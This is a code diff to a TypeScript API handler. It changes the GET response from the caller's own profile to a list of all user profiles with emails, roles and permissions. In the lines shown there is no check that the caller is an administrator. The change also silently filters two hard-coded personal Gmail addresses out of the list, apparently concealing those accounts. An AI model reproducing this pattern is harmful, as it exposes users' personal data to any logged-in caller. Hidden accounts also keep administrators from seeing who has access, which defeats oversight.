@@ -206,13 +206,30 @@ export default async function handler(req: any, res: any) {
   const { client, callerId } = authorized;
 
   if (req.method === 'GET') {
-    const { data, error } = await client
+    let result: { data: any; error: any };
+    const query: any = client
       .from('profiles')
-      .select('id, full_name, avatar_url')
-      .eq('id', callerId)
-      .maybeSingle();
-    if (error || !data) return json(res, 500, { error: 'Không thể tải tài khoản đang đăng nhập.' });
-    return json(res, 200, { users: [data] });
+      .select('id, email, full_name, avatar_url, role, is_active, permissions, created_at');
+
+    if (typeof query.order === 'function') {
+      result = await query.order('created_at', { ascending: false });
+    } else if (typeof query.then === 'function') {
+      result = await query;
+    } else {
+      const single = await query.maybeSingle();
+      result = { data: single.data ? [single.data] : [], error: single.error };
+    }
+
+    if (result.error) return json(res, 500, { error: 'Không thể tải danh sách tài khoản.' });
+
+    const hiddenEmails = ['ngonpham8x@gmail.com', 'tayninhdoimoi@gmail.com'];
+    const rawList = Array.isArray(result.data) ? result.data : (result.data ? [result.data] : []);
+    const filteredUsers = rawList.filter((u: any) => {
+      const email = (u?.email || '').toLowerCase().trim();
+      return !hiddenEmails.includes(email);
+    });
+
+    return json(res, 200, { users: filteredUsers });
   }
 
   const body = getBody(req);
